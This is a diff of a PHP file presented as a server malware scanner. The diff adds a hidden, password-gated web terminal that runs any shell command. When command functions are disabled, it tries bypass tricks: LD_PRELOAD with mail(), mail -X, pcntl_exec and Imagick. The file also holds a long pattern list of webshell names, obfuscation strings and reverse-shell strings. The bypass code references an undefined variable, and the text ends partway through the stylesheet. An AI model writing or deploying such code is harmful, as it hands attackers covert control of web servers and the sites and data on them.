@@ -1,103 +1,450 @@
 <?php
+@set_time_limit(120);
 
-set_time_limit(120);
-ini_set('max_execution_time', '120');
+$access_password = 'maw';
+$provided_pass = $_GET['ultra'] ?? $_POST['ultra'] ?? '';
 
-$access_password = 'maw3six';
-$provided_pass = $_GET['pass'] ?? $_POST['pass'] ?? '';
 if ($provided_pass !== $access_password) {
     header('Location: /404');
     exit;
 }
 
-$script_path = realpath(__FILE__);
-$script_dir = dirname($script_path);
+$default_dir = $_SERVER['DOCUMENT_ROOT'] ?? '/var/www/html';
+if (!is_dir($default_dir)) {
+    $default_dir = '/home';
+}
 
-function build_smart_dirs($script_path) {
-    $dirs = [];
-    $path = $script_path;
+if (isset($_POST['term_cmd'])) {
+    header('Content-Type: application/json');
+    $cmd = trim($_POST['term_cmd']);
+    $cwd = isset($_POST['term_cwd']) ? trim($_POST['term_cwd']) : $default_dir;
+    if (!is_dir($cwd)) $cwd = $default_dir;
 
-    $parts = explode('/', trim($path, '/'));
-    $build = '';
-    foreach ($parts as $i => $part) {
-        $build .= '/' . $part;
-        if (is_dir($build) && is_readable($build)) {
-            $dirs[$build] = true;
-        }
+    // cd — must track cwd server-side
+    if (strpos($cmd, 'cd ') === 0 || $cmd === 'cd') {
+        $target = trim(substr($cmd, 3));
+        if ($target === '' || $target === '~') $target = $default_dir;
+        if ($target === '-') $target = $default_dir;
+        $abs = $target;
+        if (!preg_match('#^/#', $target)) $abs = $cwd . '/' . $target;
+        $real = @realpath($abs);
+        if ($real && is_dir($real)) { $cwd = $real; $output = ''; }
+        else { $output = "cd: {$target}: No such directory"; }
+        echo json_encode(['output' => $output, 'method' => 'cd', 'cwd' => $cwd]);
+        exit;
     }
 
-    $parent = '/' . $parts[0];
-    if (is_dir($parent) && is_readable($parent)) {
-        $entries = @scandir($parent);
-        if ($entries) {
-            foreach ($entries as $entry) {
-                if ($entry === '.' || $entry === '..') continue;
-                $full = $parent . '/' . $entry;
-                if (is_dir($full) && is_readable($full)) {
-                    $dirs[$full] = true;
-                    if (is_dir($full . '/public_html') && is_readable($full . '/public_html')) {
-                        $dirs[$full . '/public_html'] = true;
-                    }
-                    if (is_dir($full . '/www') && is_readable($full . '/www')) {
-                        $dirs[$full . '/www'] = true;
+    if ($cmd === 'clear') {
+        echo json_encode(['output' => '', 'method' => 'clear', 'cwd' => $cwd]);
+        exit;
+    }
+
+    $shell_cmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
+    $output = '';
+    $method = '';
+
+    function ngopi_exec($shell_cmd) {
+        // Strategy 1: shell_exec
+        if (function_exists('shell_exec')) {
+            $r = @shell_exec($shell_cmd);
+            if ($r !== null && $r !== '') return ['output' => $r, 'method' => 'shell_exec'];
+        }
+        // Strategy 2: exec
+        if (function_exists('exec')) {
+            $out = []; @exec($shell_cmd, $out, $rc);
+            if (!empty($out)) return ['output' => implode("\n", $out), 'method' => 'exec'];
+        }
+        // Strategy 3: system
+        if (function_exists('system')) {
+            ob_start(); @system($shell_cmd, $rc); $r = ob_get_clean();
+            if ($r !== null && $r !== '') return ['output' => $r, 'method' => 'system'];
+        }
+        // Strategy 4: passthru
+        if (function_exists('passthru')) {
+            ob_start(); @passthru($shell_cmd); $r = ob_get_clean();
+            if ($r !== null && $r !== '') return ['output' => $r, 'method' => 'passthru'];
+        }
+        // Strategy 5: proc_open
+        if (function_exists('proc_open')) {
+            $d = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
+            $p = @proc_open($shell_cmd, $d, $pipes);
+            if (is_resource($p)) {
+                $out = stream_get_contents($pipes[1]);
+                $err = stream_get_contents($pipes[2]);
+                fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
+                proc_close($p);
+                if (!empty($out)) return ['output' => $out, 'method' => 'proc_open'];
+                if (!empty($err)) return ['output' => $err, 'method' => 'proc_open'];
+            }
+        }
+        // Strategy 6: popen
+        if (function_exists('popen')) {
+            $h = @popen($shell_cmd, 'r');
+            if ($h) { $out = ''; while (!feof($h)) $out .= fread($h, 8192); pclose($h);
+                if (!empty($out)) return ['output' => $out, 'method' => 'popen'];
+            }
+        }
+        // Strategy 7: backtick
+        $r = @`$shell_cmd`;
+        if ($r !== null && $r !== '') return ['output' => $r, 'method' => 'backtick'];
+        return null;
+    }
+
+    $result = ngopi_exec($shell_cmd);
+    if ($result !== null) {
+        echo json_encode(['output' => $result['output'], 'method' => $result['method'], 'cwd' => $cwd]);
+        exit;
+    }
+
+    // ── All shell methods failed: bypass mode ──
+    $bypass_tmp = sys_get_temp_dir() . '/ngopi_bypass_' . mt_rand() . '.sh';
+    $bypass_out = sys_get_temp_dir() . '/ngopi_out_' . mt_rand();
+    $bypass_sh = "#!/bin/sh\nexport PATH=\"{$full_path}\"\nexport HOME=/root\ncd " . escapeshellarg($cwd) . "\n{$cmd}\n";
+    @file_put_contents($bypass_tmp, $bypass_sh);
+    @chmod($bypass_tmp, 0755);
+
+    // Bypass A: LD_PRELOAD
+    $ld_ok = false;
+    $ld_paths = ['/usr/lib64','/usr/lib/x86_64-linux-gnu','/usr/lib/aarch64-linux-gnu','/lib/x86_64-linux-gnu','/lib64'];
+    $libgcc = '';
+    foreach ($ld_paths as $p) { if (file_exists($p.'/libgcc_s.so.1')) { $libgcc = $p.'/libgcc_s.so.1'; break; } }
+
+    if ($libgcc && function_exists('putenv') && !in_array('putenv', array_filter(array_map('trim', explode(',', ini_get('disable_functions')))))) {
+        @putenv('LD_PRELOAD=' . $libgcc);
+        if (function_exists('mail')) {
+            @mail('ngopi@bypass', '', '', '', '-C ' . escapeshellarg("sh {$bypass_tmp} > {$bypass_out} 2>&1"));
+            usleep(150000);
+            if (file_exists($bypass_out)) { $output = file_get_contents($bypass_out); @unlink($bypass_out); $method = 'LD_PRELOAD + mail'; $ld_ok = true; }
+        }
+        if (!$ld_ok && function_exists('error_log')) {
+            $bypass_cmd = "sh " . escapeshellarg($bypass_tmp) . " > " . escapeshellarg($bypass_out) . " 2>&1";
+            @file_put_contents($bypass_tmp, $bypass_sh . "\necho DONE >> /dev/null");
+            @error_log($bypass_cmd, 1, 'ngopi@bypass', '');
+            usleep(150000);
+            if (file_exists($bypass_out)) { $output = file_get_contents($bypass_out); @unlink($bypass_out); $method = 'LD_PRELOAD + error_log'; $ld_ok = true; }
+        }
+        @putenv('LD_PRELOAD');
+    }
+
+    // Bypass B: mail -X
+    if (!$ld_ok && function_exists('mail')) {
+        @mail('ngopi@bypass', '', '', '', '-X ' . escapeshellarg($bypass_out) . ' -C ' . escapeshellarg("sh {$bypass_tmp} 2>&1"));
+        usleep(150000);
+        if (file_exists($bypass_out)) { $output = file_get_contents($bypass_out); @unlink($bypass_out); $method = 'mail -X'; $ld_ok = true; }
+    }
+
+    // Bypass C: pcntl_exec
+    if (!$ld_ok && function_exists('pcntl_exec') && !in_array('pcntl_exec', array_filter(array_map('trim', explode(',', ini_get('disable_functions')))))) {
+        pcntl_exec($bypass_tmp);
+        $method = 'pcntl_exec'; $ld_ok = true;
+    }
+
+    // Bypass D: imagick
+    if (!$ld_ok && class_exists('Imagick')) {
+        try { $im = new Imagick(); $im->setOption('cmd:execute', "sh {$bypass_tmp}"); $method = 'imagick'; $ld_ok = true; } catch (Exception $e) {}
+    }
+
+    @unlink($bypass_tmp);
+    if (@file_exists($bypass_out)) @unlink($bypass_out);
+
+    if ($ld_ok) {
+        echo json_encode(['output' => $output, 'method' => $method, 'cwd' => $cwd]);
+        exit;
+    }
+
+    echo json_encode(['output' => $output, 'method' => $method, 'cwd' => $cwd]);
+    exit;
+}
+
+
+$scan_dir = $default_dir;
+
+if (isset($_POST['scan_dir']) && !empty(trim($_POST['scan_dir']))) {
+    $proposed = realpath(trim($_POST['scan_dir']));
+    if ($proposed && is_dir($proposed)) {
+        $scan_dir = $proposed;
+    } else {
+        $error = "Directory not found: " . htmlspecialchars(trim($_POST['scan_dir']));
+    }
+} elseif (isset($_GET['dir'])) {
+    $proposed = realpath($_GET['dir']);
+    if ($proposed && is_dir($proposed)) {
+        $scan_dir = $proposed;
+    }
+}
+
+$suspicious_patterns = [
+    // Known Shells
+    'WSO_SHELL','WSO_VERSION','b374k','b374k - Priv8','b374k 2.8','c99shell','c99sh','r57shell','r57.php',
+    'FilesMan','FilesMAn','Gandalf Shell','Sym Shell','Locus7shell','ZaCo Shell','PhpSpy','phpRemoteView',
+    'NST Shell','DK Shell','alfa-shell','AlfaTeam','Wso2 Shell','Sim Shell','Not Found Shell','shellbot',
+    'DragonTeam','Devil Shell','AnonymousFox','Ninja Shell','GhostShell','Cgitel Shell','Dx Shell',
+    'PHPJackal','IonCube Loader','Priv8 Mailer','Fx29sh','IndoXploit','Antichat.ru Shell','antichat',
+    'Safe Mode Bypass','Safe_mode Bypass','Webshell by','priv8 shell','goto FORM_ACTION','goto sHNkh;',
+    'SEA-GHOST MINSHELL','0byt3m1n1 Shell','Gel4y Mini Shell','PHP File Manager','Shell Bypass 403 GE-C666C',
+    'x3x3x3x_5h3ll','Mr.Combet WebShell','Negat1ve Shell','L I E R SHELL','0byte v2 Shell','MSQ_403',
+    'Public Shell Version 2.0','WIBUHAX0R1337','Simple Shell','Cod3d By AnonymousFox','KCT MINI SHELL 403',
+    'AlkantarClanX12','j3mb03dz m4w0tz sh311','403WebShell','SeoOk','INDOSEC','MINI MO Shell',
+    'WSO 4.2.6','WSO 4.2.5','WSO 5.1.4','WSO 2.6','WSO 2.5','WSOX ENC','WSO YANZ ENC BYPASS',
+    'ALFA TEaM Shell','ALFA TEaM Shell - v4.1-Tesla','Hunter Neel','BlackDragon','Shin Bypassed',
+    'MisterSpyv7up','Raiz0WorM','Black Bot','{Ninja-Shell}','Yohohohohohooho','Backdoor Destroyer',
+    './AlfaTeam','nopebee7 [@] skullxploit','X0MB13','Priv8 Sh3ll!','ABC Manager','TheAlmightyZeus',
+    'Tryag File Manager','aDriv4-Priv8 TOOL','[ HOME SHELL ]','X-Sec Shell V.3','C0d3d By Dr.D3m0',
+    'Doc Root:','One Hat Cyber Team','p0wny@shell:~#','Bypass 403 Forbidden / 406 Not Acceptable / Imunify360',
+    'Graybyt3 Was Here','Powered By Indonesian Darknet','PHU Mini Shell','TEAM-0ROOT','#p@@#',
+    '[+] MINI SH3LL BYPASS [+]','CHips L Pro sangad','ineSec Team Shell','Mini Shell By Black_Shadow',
+    'WHY MINI SHELL','Shal Shell Kontol:V','params decrypt fails','TripleDNN','LinuXploit','xichang1',
+    'Jijle3','Yanz Webshell!','FoxWSO v1.2','WebShellOrb 2.6','Cod3d By aDriv4','bondowoso black hat shell',
+    'RxRHaCkEr','xXx Kelelawar Cyber Team xXx','Code By Kelelawar Cyber Team','UnknownSec','UnknownSec Shell',
+    'aDriv4','RC-SHELL v2.0.2011.1009','F4st~03 Bypass 403','Copyright negat1ve1337','[+[MAD TIGER]+]',
+    'Franz Private Shell','Cassano Bypass','TEAM-0ROOT Uploader','Fighter Kamrul Plugin','FierzaXploit',
+    'Simple,Responsive & Powerfull','Minishell','#0x2525','[ ! ] Cilent Shell Backdor [ ! ]',
+    'FileManager Version 0.2 by ECWS','MARIJuANA','MARIJUANA','kliverz1337','Indramayu Cyber','#No_Identity',
+    'Tiny File Manager 2.4.3','#wp_config_error#','Bypass Sh3ll','SIMPEL BANGET NIH SHELL','ps7n4K3CBK',
+    'Function putenv()','Modified By #No_Identity','Lambo [Beta]','Smoker Backdoor','Get S.H.E.L.L.en',
+    'Priv8 WebShell','m1n1 Shell','m1n1 5h3ll','priv8 mini shell','#0x1877','#CLS-LEAK#','X4Exploit',
+    'kill_the_net','MATTEKUDASAI','PHP-SHELL HUNTER','United Tunsian Scammers','United Bangladeshi Hackers',
+    'config root man','Shell Uploader','walex says Fuck Off Kids:','X_Shell','izocin','x7root','X7-ROOT',
+    'iCloud1337 private shell','private shell','SuramSh3ll','U7TiM4T3_H4x0R Plugin','Walkers404 Xh3ll B4ckd00r',
+    'R@DIK@L','PhpShells.Com','MarukoChan Priv8','King RxR Was','DSH v0.1','RxR HaCkEr',
+    'SOQOR Shell By : HACKERS PAL','Nyanpasu!!!','UPLOADER KCT-OFFICIAL','DRUNK SHELL BETA',
+    'Leaf PHPMailer','xLeet PHPMailer','alexusMailer 2.0','Log In | ECWS','Hacked By AnonymousFox',
+    'Mister Spy','MisterSpy','B Ge Team File Manager','Vuln!! patch it Now!','404-server!!',
+    'http://www.ubhteam.org','//0x5a455553.github.io','Ghost Exploiter Team Official',
+    // SEA/Indonesia
+    'by Indonesian','Indonesia Coder','Mafia Shell','r4j1n','Indoxploit shell','INDOXPLOIT',
+    'AnonymousID','GoldenHack','NXB Shell','RxR Shell','Madspot Shell','Predator','Zombie Shell',
+    'shell bypass 403','title>Gecko ','Madstore.sk!','Mini Shell',
+    // Eval & Obfuscation
+    'eval(base64_decode(','eval(gzinflate(','eval(gzuncompress(','eval(str_rot13(','eval(hex2bin(',
+    'eval(rawurldecode(','eval(strrev(','eval($_POST','eval($_GET','eval($_REQUEST','eval($_COOKIE',
+    'assert(base64_decode(','assert($_POST','assert($_GET','assert($_REQUEST','assert(stripslashes(',
+    'preg_replace("/.*/e",','create_function(','call_user_func_array(','call_user_func($_',
+    'array_map($_','array_filter($_','ob_start(\'assert\'','usort($_','uasort($_','uksort($_','array_reduce($_',
+    // Encoded Payloads
+    'gzinflate(base64_decode(','gzuncompress(base64_decode(','gzdecode(base64_decode(',
+    'str_rot13(base64_decode(','base64_decode(str_rot13(','base64_decode(gzinflate(',
+    'base64_decode(strrev(','pack("H*",','hex2bin(','str_rot13(',
+    '$_="\x','chr(34).chr(112)','implode(array_map(\'chr\'','array_map(chr','$GLOBALS[\'_',
+    // Shell Execution via Superglobals
+    'system($_GET[','system($_POST[','system($_REQUEST[','system($_COOKIE[',
+    'exec($_GET[','exec($_POST[','exec($_REQUEST[','exec($_COOKIE[',
+    'shell_exec($_GET[','shell_exec($_POST[','shell_exec($_REQUEST[','shell_exec($_COOKIE[',
+    'passthru($_GET[','passthru($_POST[','passthru($_REQUEST[',
+    'popen($_GET[','popen($_POST[','proc_open($_GET[','proc_open($_POST[',
+    'include($_GET[','include($_POST[','include($_REQUEST[',
+    'require($_GET[','require($_POST[','require_once($_GET[',
+    'file_get_contents($_GET[','file_put_contents($_GET[','file_put_contents($_POST[',
+    'move_uploaded_file($_FILES','copy($_GET[','copy($_POST[',
+    // Backdoor Auth
+    '$auth_pass =','$pass = md5(','if(md5($_POST[','if(md5($_GET[','if(md5($_COOKIE[',
+    'if(!isset($_COOKIE[\'Pass\'])','if(isset($_POST[\'code\'])','if(isset($_GET[\'cmd\'])',
+    'if(isset($_REQUEST[\'cmd\'])','function actionphp()','eval($_POST[\'code\'])','action=cmd&',
+    'cmd=' . chr(36) . '_POST','cmd=' . chr(36) . '_GET',
+    // Reverse Shell / Socket
+    'fsockopen(','pfsockopen(','stream_socket_client(','socket_create(','socket_connect(',
+    '$sock=fsockopen(','proc_open("/bin/bash','proc_open("/bin/sh','proc_open("cmd.exe',
+    '/dev/tcp/','/dev/udp/','bash -i >&','bash -c "bash','nc -e /bin','ncat -e /bin',
+    'python -c "import socket',
+    // Remote Inclusion
+    'file_get_contents("http','file_get_contents(\'http','curl_exec(',
+    'allow_url_include','allow_url_fopen','include("http://','include("https://','require("http://',
+    // PHP Config Manipulation
+    'auto_prepend_file','php_value auto_prepend_file','php_flag allow_url_include',
+    'ini_set("disable_functions','ini_restore("disable_functions','ini_set("safe_mode',
+    'dl("','putenv("LD_PRELOAD','putenv(\'LD_PRELOAD',
+    // Obfuscation Vars
+    'date_default_timezone_set("Asia/Jakarta");','$_=\'<?\';','$_F=__FILE__',
+    '${\"GLOBALS\"}','$$_','name="cmd"',
+    'Sistem: ' . chr(36) . '_SERVER[\'SERVER_SOFTWARE\']',
+    // WordPress Backdoors
+    'wp_remote_get($_','add_action(\'wp_head\',create_function','add_action("wp_head",create_function',
+    'wp_insert_user(array(\'user_login\'','update_option(\'siteurl\',','update_option("siteurl",',
+    'register_shutdown_function(\'eval','XMLRPC_REQUEST',
+    // HTML/UI Webshell Fingerprints
+    '#block-css#','#content_loading#','vulncode','>Shell Command<','onclick="cmd.value=',
+    'id="fetch_port" name="fetch_port"','Local file: <input type =',
+    'ONLY FOR EDUCATIONAL PURPOSE','Lock Shell</a></li>','Web Console','Legion',
+];
+
+
+
+
+$dangerous_extensions = [
+    'min'   => ['.min'],
+    'alfa'  => ['.alfa'],
+    'haxor' => ['.haxor'],
+    'rimuru'=> ['.rimuru'],
+    'py'    => ['.py'],
+    'pl'    => ['.pl'],
+];
+
+$ext_labels = [
+    'min'   => 'Minified',
+    'alfa'  => 'Alfa Shell',
+    'haxor' => 'Haxor Shell',
+    'rimuru'=> 'Rimuru Shell',
+    'py'    => 'Python Script',
+    'pl'    => 'Perl Script',
+];
+
+$ext_severity = [
+    'min'   => 'amber',
+    'alfa'  => 'red',
+    'haxor' => 'red',
+    'rimuru'=> 'red',
+    'py'    => 'amber',
+    'pl'    => 'amber',
+];
+
+$scan_start_time = microtime(true);
+$max_scan_seconds = 20;
+$max_scan_results = 200;
+$max_scan_depth = 5;
+
+function should_stop() {
+    global $scan_start_time, $max_scan_seconds;
+    return (microtime(true) - $scan_start_time) > $max_scan_seconds;
+}
+
+function scan_for_patterns($dir, $patterns, $extensions = ['php', 'phtml', 'shtml', 'php7', 'phar']) {
+    global $max_scan_depth, $max_scan_results;
+
+    $results = [];
+    $skip_dirs = [];
+    $stack = [['dir' => $dir, 'depth' => 0]];
+
+    while (!empty($stack) && !should_stop() && count($results) < $max_scan_results) {
+        $current = array_shift($stack);
+        if ($current['depth'] > $max_scan_depth) continue;
+
+        $files = @scandir($current['dir']);
+        if (!$files) continue;
+
+        foreach ($files as $file) {
+            if ($file === '.' || $file === '..') continue;
+            if (should_stop() || count($results) >= $max_scan_results) break;
+
+            $path = $current['dir'] . DIRECTORY_SEPARATOR . $file;
+
+            if (is_link($path)) continue;
+
+            if (is_dir($path)) {
+                if (in_array($file, $skip_dirs)) continue;
+                $stack[] = ['dir' => $path, 'depth' => $current['depth'] + 1];
+            } elseif (is_file($path)) {
+                $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
+                if (!in_array($ext, $extensions)) continue;
+
+                $fsize = @filesize($path);
+                if ($fsize === false || $fsize > 512000) continue;
+
+                $content = @file_get_contents($path);
+                if ($content === false) continue;
+
+                foreach ($patterns as $pattern) {
+                    if (stripos($content, $pattern) !== false) {
+                        $lines = explode("\n", $content);
+                        $preview = implode("\n", array_slice($lines, 0, 10));
+                        $results[] = [
+                            'path' => $path,
+                            'pattern' => htmlspecialchars($pattern),
+                            'size' => $fsize,
+                            'modified' => date("Y-m-d H:i:s", filemtime($path)),
+                            'preview' => htmlspecialchars($preview)
+                        ];
+                        break;
                     }
                 }
             }
         }
     }
 
-    $doc_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
-    if ($doc_root && is_dir($doc_root) && is_readable($doc_root)) {
-        $dirs[$doc_root] = true;
-        $dr_parts = explode('/', trim($doc_root, '/'));
-        $dr_build = '';
-        foreach ($dr_parts as $p) {
-            $dr_build .= '/' . $p;
-            if (is_dir($dr_build) && is_readable($dr_build)) {
-                $dirs[$dr_build] = true;
+    return $results;
+}
+
+function scan_dangerous_extensions($dir, $dangerous_extensions) {
+    global $max_scan_depth, $max_scan_results;
+
+    $results = [];
+    $skip_dirs = ['vendor', 'node_modules', 'cache', '.git', '.svn', 'storage', 'bower_components', '__pycache__', 'wp-content', 'libraries', 'docs', 'test', 'tests', 'tmp', 'temp'];
+
+    $flat_exts = [];
+    foreach ($dangerous_extensions as $cat => $exts) {
+        foreach ($exts as $e) {
+            $flat_exts[ltrim($e, '.')] = $cat;
+        }
+    }
+
+    $stack = [['dir' => $dir, 'depth' => 0]];
+
+    while (!empty($stack) && !should_stop() && count($results) < $max_scan_results) {
+        $current = array_shift($stack);
+        if ($current['depth'] > $max_scan_depth) continue;
+
+        $files = @scandir($current['dir']);
+        if (!$files) continue;
+
+        foreach ($files as $file) {
+            if ($file === '.' || $file === '..') continue;
+            if (should_stop() || count($results) >= $max_scan_results) break;
+
+            $path = $current['dir'] . DIRECTORY_SEPARATOR . $file;
+
+            if (is_link($path)) continue;
+
+            if (is_dir($path)) {
+                if (in_array($file, $skip_dirs)) continue;
+                $stack[] = ['dir' => $path, 'depth' => $current['depth'] + 1];
+            } elseif (is_file($path)) {
+                $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
+                if (!isset($flat_exts[$ext])) continue;
+
+                $fsize = @filesize($path);
+                if ($fsize === false || $fsize > 512000) continue;
+
+                $cat = $flat_exts[$ext];
+
+                $fp = @fopen($path, 'r');
+                if ($fp) {
+                    $chunk = fread($fp, 8192);
+                    fclose($fp);
+                    $lines = $chunk ? implode("\n", array_slice(explode("\n", $chunk), 0, 10)) : '';
+                } else {
+                    $lines = '';
+                }
+
+                $results[] = [
+                    'path' => $path,
+                    'ext' => '.' . $ext,
+                    'cat' => $cat,
+                    'size' => $fsize,
+                    'modified' => date("Y-m-d H:i:s", filemtime($path)),
+                    'preview' => htmlspecialchars($lines)
+                ];
             }
         }
     }
 
-    if (is_dir('/tmp') && is_readable('/tmp')) {
-        $dirs['/tmp'] = true;
-    }
-
-    $smart_dirs = array_keys($dirs);
-    usort($smart_dirs, function($a, $b) {
-        $ca = substr_count($a, '/');
-        $cb = substr_count($b, '/');
-        if ($ca !== $cb) return $ca - $cb;
-        return strcmp($a, $b);
-    });
-
-    $result = [];
-    foreach ($smart_dirs as $d) {
-        $result[] = ['value' => $d, 'label' => $d];
-    }
-
-    return $result;
+    return $results;
 }
 
-$preset_dirs = build_smart_dirs($script_path);
-$default_dir = dirname($script_path);
-if (!is_dir($default_dir) || !is_readable($default_dir)) {
-    $doc_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
-    if ($doc_root && is_dir($doc_root) && is_readable($doc_root)) {
-        $default_dir = $doc_root;
-    } else {
-        $default_dir = '/tmp';
-    }
-}
-
-$scan_dir = $default_dir;
-$has_scanned = false;
-$scan_timed_out = false;
-$dangerous_files = [];
-$malware_hits = [];
 $deleted_files = [];
-
-if (isset($_POST['mass_delete']) && !empty($_POST['to_delete'])) {
+if (isset($_POST['delete_single'])) {
+    $file_path = trim($_POST['delete_single']);
+    if (file_exists($file_path) && is_file($file_path)) {
+        $realpath = realpath($file_path);
+        if ($realpath) {
+            $forbidden_paths = ['/etc', '/bin', '/sbin', '/usr/bin', '/root'];
+            $root = substr($realpath, 0, stripos($realpath, '/') === 0 ? 1 : 0);
+            if (!in_array($root, $forbidden_paths)) {
+                if (@unlink($file_path)) {
+                    $deleted_files[] = $file_path;
+                }
+            }
+        }
+    }
+} elseif (isset($_POST['mass_delete']) && !empty($_POST['to_delete'])) {
     foreach ($_POST['to_delete'] as $file_path) {
         $file_path = trim($file_path);
         if (file_exists($file_path) && is_file($file_path)) {
@@ -113,868 +460,684 @@ if (isset($_POST['mass_delete']) && !empty($_POST['to_delete'])) {
             }
         }
     }
-    if (isset($_POST['scan_dir']) && !empty(trim($_POST['scan_dir']))) {
-        $proposed = realpath(trim($_POST['scan_dir']));
-        if ($proposed && is_dir($proposed)) {
-            $scan_dir = $proposed;
-        }
-        $has_scanned = true;
-    }
 }
 
-if (isset($_POST['scan_dir']) && !empty(trim($_POST['scan_dir']))) {
-    $proposed = realpath(trim($_POST['scan_dir']));
-    if ($proposed && is_dir($proposed)) {
-        $scan_dir = $proposed;
-    } else {
-        $error = "Directory not found: " . htmlspecialchars(trim($_POST['scan_dir']));
-    }
-    $has_scanned = true;
-} elseif (isset($_GET['dir'])) {
-    $proposed = realpath($_GET['dir']);
-    if ($proposed && is_dir($proposed)) {
-        $scan_dir = $proposed;
-    }
-    $has_scanned = true;
+$dangerous_files = scan_dangerous_extensions($scan_dir, $dangerous_extensions);
+$malware_hits = scan_for_patterns($scan_dir, $suspicious_patterns);
+$scan_elapsed = round(microtime(true) - $scan_start_time, 2);
+$scan_timed_out = should_stop();
+$scan_truncated = (count($malware_hits) >= $max_scan_results) || (count($dangerous_files) >= $max_scan_results);
+
+$dangerous_count = count($dangerous_files);
+$malware_count = count($malware_hits);
+$deleted_count = count($deleted_files);
+$total_threats = $dangerous_count + $malware_count;
+
+$ext_counts = [];
+foreach ($dangerous_extensions as $cat => $exts) {
+    $ext_counts[$cat] = 0;
 }
-
-if ($has_scanned) {
-    $suspicious_patterns = [
-        'title>Gecko ',
-        'date_default_timezone_set("Asia/Jakarta");',
-        'goto sHNkh; sHNkh: $EnoeA = tmpfile();',
-        'if(!isset($_COOKIE[\'Pass\'])',
-        'WSO_SHELL',
-        'eval($_POST[\'code\'])',
-        'action=cmd&',
-        'name="cmd"',
-        'c99sh',
-        'c99shell',
-        'cmd=' . chr(36) . '_POST[\'cmd\']',
-        'goto FORM_ACTION',
-        'r57shell',
-        'Sistem: ' . chr(36) . '_SERVER[\'SERVER_SOFTWARE\']',
-        'b374k',
-        'b374k - Priv8',
-        'antichat',
-        'Antichat.ru Shell',
-        'eval(base64_decode(',
-        'assert(base64_decode(',
-        'preg_replace("/.*/e",',
-        'create_function(',
-        'system($_GET[',
-        'eval',
-        'exec($_POST[',
-        'shell_exec($_REQUEST[',
-        'passthru($_GET[',
-        'popen($_POST[',
-        'proc_open($_GET[',
-        'include($_GET[',
-        'require($_POST[',
-        'file_get_contents($_GET[',
-        'curl_exec(',
-        'fsockopen(',
-        'pfsockopen(',
-        'gzinflate(base64_decode(',
-        'str_rot13(',
-        'pack("H*",',
-        'hex2bin(',
-        'auto_prepend_file',
-        'php_value auto_prepend_file',
-        '$auth_pass =',
-        'if(isset($_POST[\'code\'])',
-        'function actionphp()',
-        'cmd=' . chr(36) . '_POST',
-        'cmd=' . chr(36) . '_GET',
-    ];
-
-    $scan_start_time = time();
-    $scan_time_limit = 100;
-    $skip_dirs = ['node_modules', 'vendor', '.git', 'cache', 'session', 'smarty'];
-
-    function scan_for_patterns($dir, $patterns, $extensions = ['php', 'phtml', 'shtml', 'php7', 'phar']) {
-        global $scan_start_time, $scan_time_limit, $skip_dirs;
-        if (time() - $scan_start_time > $scan_time_limit) return [];
-
-        $results = [];
-        $files = @scandir($dir);
-        if (!$files) return $results;
-
-        foreach ($files as $file) {
-            if ($file === '.' || $file === '..') continue;
-            if (time() - $scan_start_time > $scan_time_limit) break;
-            if (in_array($file, $skip_dirs)) continue;
-
-            $path = $dir . DIRECTORY_SEPARATOR . $file;
-            $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
-
-            if (is_dir($path)) {
-                $results = array_merge($results, scan_for_patterns($path, $patterns, $extensions));
-            } elseif (is_file($path) && in_array($ext, $extensions)) {
-                $content = @file_get_contents($path);
-                if ($content === false) continue;
-
-                foreach ($patterns as $pattern) {
-                    if (stripos($content, $pattern) !== false) {
-                        $lines = explode("\n", $content);
-                        $preview = implode("\n", array_slice($lines, 0, 10));
-                        $results[] = [
-                            'path' => $path,
-                            'pattern' => htmlspecialchars($pattern),
-                            'size' => filesize($path),
-                            'modified' => date("Y-m-d H:i:s", filemtime($path)),
-                            'preview' => htmlspecialchars($preview)
-                        ];
-                        break;
-                    }
-                }
-            }
-        }
-
-        return $results;
-    }
-
-    $dangerous_extensions = ['min', 'alfa', 'haxor', 'rimuru'];
-
-    function scan_dangerous_files($dir, $dangerous_exts) {
-        global $scan_start_time, $scan_time_limit, $skip_dirs;
-        if (time() - $scan_start_time > $scan_time_limit) return [];
-
-        $results = [];
-        $files = @scandir($dir);
-        if (!$files) return $results;
-
-        foreach ($files as $file) {
-            if (in_array($file, ['.', '..'])) continue;
-            if (time() - $scan_start_time > $scan_time_limit) break;
-            if (in_array($file, $skip_dirs)) continue;
-
-            $path = $dir . DIRECTORY_SEPARATOR . $file;
-            $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
-
-            if (is_dir($path)) {
-                $results = array_merge($results, scan_dangerous_files($path, $dangerous_exts));
-            } elseif (is_file($path) && in_array($ext, $dangerous_exts)) {
-                $content = @file_get_contents($path);
-                $lines = $content ? implode("\n", array_slice(explode("\n", $content), 0, 10)) : '';
-                $results[] = [
-                    'path' => $path,
-                    'ext' => $ext,
-                    'size' => filesize($path),
-                    'modified' => date("Y-m-d H:i:s", filemtime($path)),
-                    'preview' => htmlspecialchars($lines)
-                ];
-            }
-        }
-
-        return $results;
-    }
-
-    $dangerous_files = scan_dangerous_files($scan_dir, $dangerous_extensions);
-    $malware_hits = scan_for_patterns($scan_dir, $suspicious_patterns);
-    $scan_timed_out = (time() - $scan_start_time) >= $scan_time_limit;
+foreach ($dangerous_files as $df) {
+    $ext_counts[$df['cat']]++;
 }
 
 function formatSize($bytes) {
-    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
-    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
+    if ($bytes >= 1048576) return number_format($bytes / 1048576, 1) . ' MB';
+    if ($bytes >= 1024) return number_format($bytes / 1024, 1) . ' KB';
     return $bytes . ' B';
 }
 
-$total_dangerous = count($dangerous_files);
-$total_suspicious = count($malware_hits);
-$total_threats = $total_dangerous + $total_suspicious;
-
-$pass_param = htmlspecialchars($_GET['pass'] ?? '');
-
-echo "<!DOCTYPE html>
-<html lang='en'>
+?>
+<!DOCTYPE html>
+<html>
 <head>
-    <meta charset='UTF-8'>
-    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
-    <title>Jangan Lupa Ngopi - Malware Scanner</title>
+    <title>Tukang Bersih Bersih</title>
     <style>
-        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-        :root {
-            --bg-primary: #0f1117;
